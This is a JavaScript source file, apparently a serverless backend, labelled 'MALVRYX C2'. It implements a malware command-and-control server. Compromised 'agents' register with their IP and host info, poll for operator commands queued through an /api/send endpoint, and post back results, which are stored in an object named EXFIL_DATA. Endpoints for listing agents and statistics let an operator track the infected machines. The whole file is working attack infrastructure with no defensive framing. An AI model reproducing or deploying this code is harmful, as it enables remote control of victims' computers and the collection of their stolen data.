// ================================================================
// MALVRYX C2 — Vercel Serverless Backend
// ================================================================

const AGENTS = {};
const COMMAND_QUEUE = {};
const EXFIL_DATA = {};

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    let body = req.body || {};
    if (req.method === 'POST' && Object.keys(body).length === 0) {
        body = req.query;
    }

    const { agent, command, data, agentId, args } = body;

    if (command === 'register') {
        const id = agent || `agent_${Date.now().toString(36)}`;
        AGENTS[id] = {
            id,
            info: data || {},
            lastSeen: Date.now(),
            firstSeen: Date.now(),
            ip: req.headers['x-forwarded-for'] || 'unknown',
            commandsExecuted: 0
        };
        if (!COMMAND_QUEUE[id]) COMMAND_QUEUE[id] = [];
        return res.json({ status: 'registered', agentId: id });
    }

    if (command === 'poll') {
        const id = agent;
        if (!AGENTS[id]) return res.json({ error: 'Agent not found' });
        AGENTS[id].lastSeen = Date.now();
        if (COMMAND_QUEUE[id] && COMMAND_QUEUE[id].length > 0) {
            const cmd = COMMAND_QUEUE[id].shift();
            AGENTS[id].commandsExecuted++;
            return res.json(cmd);
        }
        return res.json({ command: 'noop' });
    }

    if (command === 'result' || command === 'error') {
        const id = agent;
        if (AGENTS[id]) {
            if (!EXFIL_DATA[id]) EXFIL_DATA[id] = [];
            EXFIL_DATA[id].push({ time: Date.now(), type: command, data });
        }
        return res.json({ status: 'ok' });
    }

    if (req.method === 'GET' && req.url === '/api/agents') {
        const list = Object.keys(AGENTS).map(id => ({
            id,
            info: AGENTS[id].info,
            lastSeen: AGENTS[id].lastSeen,
            ip: AGENTS[id].ip,
            commandsExecuted: AGENTS[id].commandsExecuted,
            online: (Date.now() - AGENTS[id].lastSeen) < 60000
        }));
        return res.json(list);
    }

    if (req.method === 'POST' && req.url === '/api/send') {
        const { agentId, command, data, args } = body;
        if (!agentId || !command) {
            return res.status(400).json({ error: 'agentId and command required' });
        }
        if (!AGENTS[agentId]) {
            return res.status(404).json({ error: 'Agent not found' });
        }
        if (!COMMAND_QUEUE[agentId]) COMMAND_QUEUE[agentId] = [];
        COMMAND_QUEUE[agentId].push({ command, data, args });
        return res.json({ status: 'queued', agentId, command });
    }

    if (req.method === 'GET' && req.url === '/api/stats') {
        const total = Object.keys(AGENTS).length;
        const online = Object.keys(AGENTS).filter(id => (Date.now() - AGENTS[id].lastSeen) < 60000).length;
        const commands = Object.values(AGENTS).reduce((sum, a) => sum + a.commandsExecuted, 0);
        return res.json({ totalAgents: total, onlineAgents: online, totalCommands: commands });
    }

    res.status(404).json({ error: 'Not found' });
};
